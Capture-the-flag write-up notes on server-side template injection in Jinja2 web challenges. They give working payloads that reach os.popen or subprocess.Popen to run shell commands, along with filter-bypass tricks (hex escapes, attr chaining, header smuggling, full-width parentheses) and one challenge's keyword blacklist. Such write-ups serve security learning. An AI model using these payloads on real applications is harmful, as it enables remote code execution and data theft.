- ## Imaginary ctf 2021(Build-a-website):
  Problem: Web page had an input box for html code. Entering {{7*7}} reurns 49. Thus it is prone too ssti
  Initial payload: ```{{ ()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')() }}```
  This was interesting, the filer in the script didnt allow use of class, base or global so the attr was used instead and hexadecimal notations of class,
  base and subclasses was used which makes the payload in ascii:
  ```{{__class__.__base__.__subclasses__}}``` <br>
  The empty tuple () in the expression serves as an object from which we can start chaining attribute lookups <br>
  the | operator is used to chain these filters together, applying each one in sequence to transform the value step by step. <br>

  This gives a list of all the modules. Index of ```<class 'subprocess.Popen'>``` at 360.

  Final payload: ```{{()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')()|attr('__getitem__')(360)("cat flag.txt",shell=True,stdout=-1)|attr('communicate')()}}```

- ## Imaginary ctf 2021(Sinking calculator): 
![image](https://github.com/poorvi1910/Web/assets/146640913/f78f996d-601d-45c4-a6dc-35fb80e43e82)
In this code, the input length is limited to 80 chars and output is only printed if it has numbers or minus.
Payload: ```calc?query=config.class.init.globals[%27os%27].popen(%27od%20-b%20-An%20fla*%27).read()``` <br>
translates to ```config.class.init.globals['os'].popen('od -b -An fla*').read()```. The command ```od -b -An fla*``` is used to display file contents in octal format, without displaying the filename (-An)
  - od: This is the "octal dump" command, which is used to display file contents in different formats (octal, hexadecimal, decimal, ASCII, etc.).
  - b: This option tells od to display the output in octal bytes. Each byte in the file(s) will be displayed as a three-digit octal number.
  - An: This option tells od to suppress the default output of file offsets. Normally, od prefixes each line of output with the byte offset of that line within the file. -An removes these offsets from the output.
  - fla*: This is a shell glob pattern. It matches any files in the current directory whose names start with "fla". For example, it could match files like "flag.txt", "flag1.txt", etc.<br>
The ouput gives a string of numbers which when converted from octal to ascii gives the flag.

- ## DarkCON CTF 2021(DMM):

The following payload will return all subclasses.

```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}```

The following payload will return the output of the id command.

```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}```

```
<div style = "text-align:center">
<h1>Oops! b&#39;app.py\nflag.txt\nrequirements.txt&#39; is 404 Not Found.</h1>
</div>
```
Listing the directory content with the following payload.

```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}```
```
<div style = "text-align:center">
<h1>Oops! b&#39;app.py\nflag.txt\nrequirements.txt&#39; is 404 Not Found.</h1>
</div>
```
And printing flag.txt file.

```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}```
```
<div style = "text-align:center">
<h1>Oops! b&#39;darkCON{w0ww_y0u_ar3_sUp3er_h4ckeR_ggwpp_!!}&#39; is 404 Not Found.</h1>
</div>
```

- ## (Unkown ctf)
  This chall required a payload with '' blacklisted
  Payload: ``` {{url_for.__globals__.os.popen(request.headers.hack).read()}}```
  It was required to supply the executable commands in the request header named ‘hack’. To achieve this, intercept the form’s POST request using Burp 
  Suite and modify the parameters accordingly.
```
GET /{{url_for.__globals__.os.popen(request.headers.hack).read()}} HTTP/1.1
hack: cat ../flag.txt
Host: chal.pctf.competitivecyber.club:5555
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://chal.pctf.competitivecyber.club:5555/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
- ## Nahamcon 2022(Deafcon):
  In this challenge, parenthesis were blacklistyed which means that any python command could not be executed. The way around this was to use full width parenthesis intead of half width which would serve the purpose and all bypass the filter.
 Final payload:```"{{ self._TemplateReferencecontext.cycler.init.globals__.os.popen（'cat flag.txt'）.read（）}}"@aaa.com```
This payload was inserted into the email field and flag was obtained

- ## Crewctf 2022 (Ezchall):
  Blocks:
  ```if input.count('.') > 1 or input.count(':') > 1 or input.count('/') > 1 :```
limited payload size: ```if len(input) < 115```
can’t use digits so we can’t bypass the blacklist with Unicode.
```
if char in string.digits:
	return False
```
Finally, the blacklist.
```UNALLOWED = [
 'class', 'mro', 'init', 'builtins', 'request', 'app','sleep', 'add', '+', 'config', 'subclasses', 'format', 'dict', 'get', 'attr', 'globals', 'time', 'read', 'import', 'sys', 'cookies', 'headers', 'doc', 'url', 'encode', 'decode', 'chr', 'ord', 'replace', 'echo', 'base', 'self', 'template', 'print', 'exec', 'response', 'join', 'cat', '%s', '{}', '\\', '*', '&',"{{", "}}", '[]',"''",'""','|','=','~']
```

Approach:
  - {{ and }} are filtered, so we’ll probably use {%
  - cycler.__init__.__globals__.os.popen('id').read()
  - to make it easier to deal with blacklisted words and also the count of dots,changed it to this format: ```cycler['__init__']['__globals__']['os']['popen']('id')['read']()```
  - we need to us an empty space between the blacklisted strings: ```cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('id')['rea' 'd']()```
  - The only problem here, is that we’re exceeding the length limit. Solution was using lipsum.: ```lipsum['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()```

- ##
